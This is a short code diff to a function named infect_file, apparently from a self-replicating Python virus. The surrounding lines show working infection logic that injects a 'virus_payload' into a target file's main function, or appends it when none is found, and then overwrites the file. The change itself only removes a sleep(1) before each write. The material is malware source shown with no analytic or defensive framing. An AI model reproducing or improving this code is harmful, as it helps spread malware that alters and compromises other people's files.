@@ -121,7 +121,6 @@ def infect_file(file, virus_payload) -> int:
         modified_payload = ["    " + line for line in virus_payload] 
         infected_code[main_function_line_number:main_function_line_number] = modified_payload
         f = open(file, 'w')
-        sleep(1)
         f.writelines(infected_code)
         sleep(1)
         f.close()
@@ -133,7 +132,6 @@ def infect_file(file, virus_payload) -> int:
     elif not file_is_infected and main_function_line_number == -1:     
         infected_code = file_code + virus_payload
         f = open(file, 'w')
-        sleep(1)
         f.writelines(infected_code)
         sleep(1)
         f.close()
